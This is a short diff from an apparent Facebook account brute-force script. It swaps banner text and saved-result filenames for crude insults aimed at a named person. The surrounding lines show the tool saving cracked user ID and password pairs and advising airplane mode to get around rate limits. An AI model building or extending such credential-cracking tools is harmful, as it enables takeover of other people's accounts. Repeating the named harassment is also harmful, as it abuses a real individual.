@@ -502,7 +502,7 @@ class Main:
 				os.system("clear")
 				print(logo)
 				print("     \033[0;93m   FREE MODE ACTIVATE")
-				print("\n\033[0;94m [+] BRUTE HAS BEEN START")
+				print("\n\033[0;94m [+] Asad Waqas Ke Chudaye Has been Start")
 				print(" \033[0;96m[+] Note: Cp Ac Open 70% JUST NOW")
 				print(" [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS")
 				print("\033[0;94m----------------------------------------------")
@@ -1333,7 +1333,7 @@ class Main:
 				open("Successfull-ASAD-WAQAS-FUCK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[Successfull-SOMII] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[Successfull-Asad-waqas-fuck] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("Successfull.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
